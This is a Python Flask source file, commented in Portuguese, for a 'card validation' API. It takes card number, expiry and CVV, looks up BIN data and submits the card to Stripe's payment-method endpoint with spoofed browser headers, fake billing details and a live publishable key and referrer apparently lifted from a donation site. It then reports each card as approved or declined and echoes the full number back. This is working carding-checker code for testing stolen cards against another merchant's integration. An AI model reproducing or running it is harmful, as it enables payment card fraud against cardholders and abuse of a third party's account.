from flask import Flask, request, jsonify
import requests
import re
import logging
from datetime import datetime

app = Flask(__name__)

# Configuração de logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class CreditCardProcessor:
    def __init__(self):
        pass
    
    def get_bin_info(self, cc_number):
        """Obtém informações do BIN usando API pública"""
        try:
            bin_code = cc_number[:6]
            
            # Tentativa com binlist.net
            response = requests.get(f'https://lookup.binlist.net/{bin_code}', 
                                  headers={'Accept-Version': '3'})
            
            if response.status_code == 200:
                data = response.json()
                return {
                    'bank': data.get('bank', {}).get('name', 'Unknown Bank'),
                    'country': data.get('country', {}).get('name', 'Unknown Country'),
                    'type': data.get('type', 'UNKNOWN').upper(),
                    'brand': data.get('scheme', 'UNKNOWN').upper()
                }
            else:
                # Fallback para detecção básica
                return self.detect_basic_info(cc_number)
                
        except Exception as e:
            logger.error(f"Erro ao obter BIN info: {str(e)}")
            return self.detect_basic_info(cc_number)
    
    def detect_basic_info(self, cc_number):
        """Detecção básica quando a API falha"""
        brand = self.detect_brand(cc_number)
        
        # Mapeamento básico de BINs conhecidos
        bin_db = {
            '519603': {'bank': 'JPMorgan Chase', 'country': 'US', 'type': 'CREDIT'},
            '536100': {'bank': 'JPMorgan Chase', 'country': 'US', 'type': 'DEBIT'},
            '411111': {'bank': 'Citibank', 'country': 'US', 'type': 'CREDIT'},
            '401288': {'bank': 'Bank of America', 'country': 'US', 'type': 'CREDIT'},
            '371449': {'bank': 'American Express', 'country': 'US', 'type': 'CREDIT'},
            '601100': {'bank': 'Discover', 'country': 'US', 'type': 'CREDIT'},
        }
        
        bin_code = cc_number[:6]
        return bin_db.get(bin_code, {
            'bank': 'Unknown Bank',
            'country': 'Unknown Country', 
            'type': 'UNKNOWN',
            'brand': brand
        })
    
    def detect_brand(self, cc_number):
        """Detecta a bandeira do cartão"""
        if cc_number.startswith('4'):
            return 'VISA'
        elif cc_number.startswith(('51', '52', '53', '54', '55')):
            return 'MASTERCARD'
        elif cc_number.startswith(('34', '37')):
            return 'AMEX'
        elif cc_number.startswith('6011'):
            return 'DISCOVER'
        elif cc_number.startswith(('300', '301', '302', '303', '304', '305')):
            return 'DINERS'
        else:
            return 'UNKNOWN'

class PaymentGateway:
    def __init__(self):
        self.stripe_headers = {
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        }

    def validate_cc_format(self, cc, mm, yy, cvv):
        """Valida o formato dos dados do cartão"""
        if not re.match(r'^\d{13,19}$', cc):
            return False, "Número do cartão inválido"
        
        if not re.match(r'^\d{1,2}$', mm) or not (1 <= int(mm) <= 12):
            return False, "Mês de expiração inválido"
        
        # Aceita ano com 2 ou 4 dígitos
        if not re.match(r'^\d{2,4}$', yy):
            return False, "Ano de expiração inválido"
        
        # Converter ano para 2 dígitos se necessário
        if len(yy) == 4:
            yy = yy[2:]
        
        if not re.match(r'^\d{3,4}$', cvv):
            return False, "CVV inválido"
            
        return True, "OK"

    def process_payment(self, cc, mm, yy, cvv):
        """Processa o pagamento através do Stripe"""
        try:
            # Validar formato
            is_valid, message = self.validate_cc_format(cc, mm, yy, cvv)
            if not is_valid:
                return {
                    'status': 'declined',
                    'http_status': 400,
                    'message': message,
                    'timestamp': datetime.now().isoformat()
                }

            # Se ano tem 4 dígitos, converter para 2
            if len(yy) == 4:
                yy = yy[2:]

            # Dados para o Stripe
            stripe_data = f'type=card&billing_details[name]=John+Doe&billing_details[email]=test@example.com&billing_details[address][postal_code]=10011&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&guid=193fcf3e-430c-4453-8839-d7d6d7009fc9ec6f96&muid=8e8b8bba-b434-4865-aa73-178d73596890c9849f&sid=77a0cea6-4990-47b7-a84d-ad5e5cfd21f37dc2bc&pasted_fields=number&payment_user_agent=stripe.js%2F1816959ce9%3B+stripe-js-v3%2F1816959ce9%3B+card-element&referrer=https%3A%2F%2Fsecure.givelively.org&key=pk_live_GWQnyoQBA8QSySDV4tPMyOgI'

            stripe_response = requests.post(
                'https://api.stripe.com/v1/payment_methods', 
                headers=self.stripe_headers, 
                data=stripe_data,
                timeout=30
            )

            # Analisar resposta do Stripe
            if stripe_response.status_code == 200:
                return {
                    'status': 'approved',
                    'http_status': 200,
                    'message': 'Cartão válido - Transação aprovada',
                    'gateway_response': stripe_response.json(),
                    'timestamp': datetime.now().isoformat()
                }
            else:
                error_data = stripe_response.json().get('error', {})
                return {
                    'status': 'declined',
                    'http_status': stripe_response.status_code,
                    'message': error_data.get('message', 'Cartão recusado'),
                    'decline_code': error_data.get('decline_code'),
                    'gateway_response': stripe_response.json(),
                    'timestamp': datetime.now().isoformat()
                }

        except requests.exceptions.Timeout:
            return {
                'status': 'declined',
                'http_status': 408,
                'message': 'Timeout na conexão com o gateway',
                'timestamp': datetime.now().isoformat()
            }
        except Exception as e:
            logger.error(f"Erro no processamento: {str(e)}")
            return {
                'status': 'declined',
                'http_status': 500,
                'message': f'Erro interno: {str(e)}',
                'timestamp': datetime.now().isoformat()
            }

# Instâncias globais
cc_processor = CreditCardProcessor()
payment_gateway = PaymentGateway()

@app.route('/')
def home():
    return jsonify({
        'message': '🔒 API de Validação de Cartões - Professional',
        'version': '2.0.0',
        'status': 'active',
        'timestamp': datetime.now().isoformat(),
        'endpoints': {
            'check_card': '/api/check?card=NUMERO|MES|ANO|CVV',
            'bin_info': '/api/bin/<BIN>'
        }
    })

@app.route('/health')
def health_check():
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat()
    })

@app.route('/api/check', methods=['GET'])
def check_card():
    """
    Endpoint para verificar cartão via GET
    Exemplo: /api/check?card=5196032158294302|08|27|356
    """
    try:
        card_param = request.args.get('card')
        if not card_param:
            return jsonify({
                'status': 'error',
                'message': 'Parâmetro "card" é obrigatório. Formato: NUMERO|MES|ANO|CVV',
                'example': '/api/check?card=5196032158294302|08|27|356'
            }), 400

        # Parse do parâmetro card
        parts = card_param.split('|')
        if len(parts) != 4:
            return jsonify({
                'status': 'error',
                'message': 'Formato inválido. Use: NUMERO|MES|ANO|CVV',
                'example': '5196032158294302|08|27|356'
            }), 400

        cc, mm, yy, cvv = parts

        # Obter informações do BIN
        bin_info = cc_processor.get_bin_info(cc)
        
        # Processar pagamento
        payment_result = payment_gateway.process_payment(cc, mm, yy, cvv)

        # Montar resposta completa
        response_data = {
            'card_info': {
                'number': cc,  # Número completo para referência
                'bin': cc[:6],
                'brand': bin_info['brand'],
                'bank': bin_info['bank'],
                'country': bin_info['country'],
                'type': bin_info['type'],
                'first_6': cc[:6],
                'last_4': cc[-4:],
                'expiry': f"{mm}/{yy}"
            },
            'verification': payment_result,
            'timestamp': datetime.now().isoformat()
        }

        # Retornar status HTTP baseado no resultado
        http_status = payment_result['http_status']
        
        return jsonify(response_data), http_status

    except Exception as e:
        logger.error(f"Erro no endpoint: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': 'Erro interno do servidor',
            'timestamp': datetime.now().isoformat()
        }), 500

@app.route('/api/bin/<bin_code>', methods=['GET'])
def get_bin_info(bin_code):
    """
    Endpoint para obter informações do BIN
    """
    if not re.match(r'^\d{6}$', bin_code):
        return jsonify({
            'status': 'error',
            'message': 'BIN deve conter 6 dígitos',
            'timestamp': datetime.now().isoformat()
        }), 400

    bin_info = cc_processor.get_bin_info(bin_code + '000000')
    return jsonify({
        'bin': bin_code,
        'info': bin_info,
        'timestamp': datetime.now().isoformat()
    })

# Error handlers
@app.errorhandler(404)
def not_found(error):
    return jsonify({
        'status': 'error',
        'message': 'Endpoint não encontrado',
        'timestamp': datetime.now().isoformat()
    }), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({
        'status': 'error',
        'message': 'Erro interno do servidor',
        'timestamp': datetime.now().isoformat()
    }), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
